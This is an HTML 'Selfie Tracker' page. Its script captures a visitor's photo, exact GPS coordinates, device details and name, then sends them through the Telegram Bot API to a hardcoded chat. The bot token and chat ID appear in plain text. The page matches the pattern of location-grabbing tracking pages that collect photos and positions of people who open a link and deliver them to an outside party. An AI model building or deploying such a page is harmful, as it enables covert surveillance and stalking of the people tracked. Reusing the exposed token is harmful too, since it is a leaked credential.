<!DOCTYPE html>
<html>
<head>
    <title>Track Me</title>
    <style>
        body {
            background-image: url('img/altarys gif.gif'); /* Keep your bg */
            background-size: cover;
            background-repeat: no-repeat;
            background-attachment: fixed;
            background-position: center;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
            text-align: center;
            font-family: Arial, sans-serif;
        }
        .container {
            background-color: rgba(0, 0, 0, 0.7);
            padding: 30px;
            border-radius: 15px;
            max-width: 500px;
        }
        iframe {
            width: 100%;
            max-width: 400px;
            height: 350px;
            border: none;
            border-radius: 12px;
            margin: 15px 0;
            background: #222;
        }
        button {
            background: #ff5722;
            border: none;
            color: white;
            padding: 14px 30px;
            border-radius: 30px;
            font-size: 18px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
        }
        button:hover { background: #e64a19; }
        #status {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
            font-size: 14px;
            word-break: break-word;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 Selfie Tracker</h1>
        <p>Click below to capture your selfie + exact GPS.</p>
        
        <!-- The iframe loads our camera engine -->
        <iframe id="cameraFrame" src="camera.html"></iframe>
        
        <button id="captureBtn">🚀 Capture & Send</button>
        <div id="status">⏳ Loading camera...</div>
    </div>

    <script>
        // ==================== CONFIG ====================
        const BOT_TOKEN = '8541864317:AAFd_Wir8E53Dt_cLnvS9A2L3UJ_OUHWkPA'; // <-- REPLACE OR HIDE
        const CHAT_ID = '5410457102';
        const iframe = document.getElementById('cameraFrame');
        const statusDiv = document.getElementById('status');

        // Wait for iframe to signal it's ready
        window.addEventListener('message', (event) => {
            if (event.data.type === 'cameraReady') {
                statusDiv.textContent = '📷 Camera is ready. Hit the button!';
            } else if (event.data.type === 'cameraError') {
                statusDiv.textContent = '❌ Camera blocked. Allow permissions and refresh.';
            }
        });

        // ==================== SEND TO TELEGRAM ====================
        async function sendToTelegram(imageData, lat, lon, source, device, userName) {
            const textMsg = `👤 Name: ${userName || 'Anonymous'}\n` +
                            `📍 Location: ${lat}, ${lon} (${source})\n` +
                            `📱 Device: ${device}\n` +
                            `🕒 Time: ${new Date().toLocaleString()}`;

            // 1. Send text
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: textMsg })
            });

            // 2. Send photo
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, photo: imageData })
            });

            // 3. Send native location pin
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, latitude: lat, longitude: lon })
            });
        }

        // ==================== MAIN ACTION ====================
        document.getElementById('captureBtn').addEventListener('click', async () => {
            statusDiv.textContent = '⏳ Capturing...';

            try {
                // Check if iframe and its function exist
                if (!iframe.contentWindow || typeof iframe.contentWindow.captureData !== 'function') {
                    statusDiv.textContent = '❌ Camera engine not loaded. Please refresh.';
                    return;
                }

                // Ask for name (optional)
                const userName = prompt('Enter your name (optional):') || 'User';

                // Call the iframe's capture function
                const data = await iframe.contentWindow.captureData();

                // Send everything
                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, userName);
                statusDiv.textContent = '✅ ALL DATA SENT! Check your Telegram.';
            } catch (err) {
                statusDiv.textContent = '❌ ERROR: ' + err.message;
                console.error(err);
            }
        });

        // If iframe fails to load at all
        iframe.onerror = () => {
            statusDiv.textContent = '❌ Failed to load camera.html. Check the file path.';
        };
    </script>
</body>
</html>
